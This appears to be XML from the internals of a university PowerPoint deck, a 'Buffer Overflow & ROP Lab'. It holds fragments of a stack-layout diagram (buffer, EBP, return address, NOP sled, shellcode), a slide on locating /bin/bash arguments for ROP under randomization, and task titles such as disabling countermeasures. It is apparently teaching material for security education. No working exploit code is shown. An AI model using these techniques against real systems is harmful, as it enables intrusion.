                </a:gridCol>
                <a:gridCol w="882595">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3708478038"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="162431">
                <a:tc gridSpan="5">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>buffer in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>bof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EBP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RET address</a:t>
                      </a:r>
                    </a:p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233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aseline="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>  NOP      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aseline="0" dirty="0"/>
                        <a:t>shell code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a known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addr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828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offset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8574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3643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211075-C80B-4C16-97C4-AD75DFEB3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Bonus: Counteract randomness for ROP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BEBB5E-F693-4A85-8349-94836873F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For ROP, the string of /bin/bash and its parameters are on stack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Their addresses may be randomized.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Like the shellcode, you may use gadget to acquire </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>their address.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1893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617</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>127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主题​​</vt:lpstr>
      <vt:lpstr>Buffer Overflow &amp; ROP Lab</vt:lpstr>
      <vt:lpstr>Preparation</vt:lpstr>
      <vt:lpstr>The victim program</vt:lpstr>
      <vt:lpstr>Turn off countermeasures</vt:lpstr>
      <vt:lpstr>exec syscall</vt:lpstr>
      <vt:lpstr>Task 1: Get familiar with shell code</vt:lpstr>
      <vt:lpstr>Task 1: Attack tools</vt:lpstr>
      <vt:lpstr>Task 2: Network structure illustration</vt:lpstr>
      <vt:lpstr>Task 2: Attack Procedure</vt:lpstr>
      <vt:lpstr>Task 3 Unknown ebp</vt:lpstr>
      <vt:lpstr>Task 4: Attack 64-bit Program</vt:lpstr>
      <vt:lpstr>Bonus</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>Task 2: ROP</vt:lpstr>
      <vt:lpstr>Task 3: Counteract randomness</vt:lpstr>
      <vt:lpstr>Bonus: Counteract randomness for ROP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Buffer Overflow Lab</dc:title>
  <dc:creator>ZHOU, Zhe</dc:creator>
  <cp:lastModifiedBy>chou zhe</cp:lastModifiedBy>
  <cp:revision>25</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-03-16T13:06:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-03-15T08:43:59Z</dcterms:modified>
</cp:coreProperties>
</file>